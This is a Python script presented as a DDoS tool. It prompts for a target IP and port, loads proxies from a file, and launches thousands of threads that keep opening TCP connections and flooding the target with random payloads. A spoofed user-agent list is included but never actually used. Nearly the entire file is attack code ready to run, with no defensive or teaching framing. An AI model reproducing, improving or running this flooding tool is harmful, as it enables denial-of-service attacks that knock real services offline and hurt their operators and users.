import os
import socket
import threading
import random
import time

def generate_payload():
    payload_size = random.randint(1024, 4096)  
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(payload_size)).encode()

def ddos_attack(target_ip, target_port, user_agent, proxy):
    while True:
        try:
            payload = generate_payload()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proxy:
                s.settimeout(10)
                s.connect(proxy)
            else:
                s.connect((target_ip, target_port))
            s.send(payload)
            print("\033[92mPayload sent successfully")
            s.close()
        except Exception as e:
            print("\033[91mMaybe the website is down or unable to attack.")
            break

def launch_attack(target_ip, target_port, user_agent=None, proxy=None):
    print("Launching DDoS attack...")
    for _ in range(5000):
        thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, user_agent, proxy))
        thread.start()
        time.sleep(0.001)

# All user agents
user_agents = [
   "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
   "Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
   "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.214 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0",
   "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
   "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
   "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
   "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
   "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
   "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
   "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
   "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
   "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
   "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
]

def read_proxies(filename):
    proxies = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    proxy = (parts[0], int(parts[1]))
                    proxies.append(proxy)
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
    return proxies

target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

proxies = read_proxies('proxy.txt')

for proxy in proxies:
    for user_agent in user_agents:
        launch_attack(target_ip, target_port, user_agent, proxy)
os.system('cls' if os.name == 'nt' else 'clear')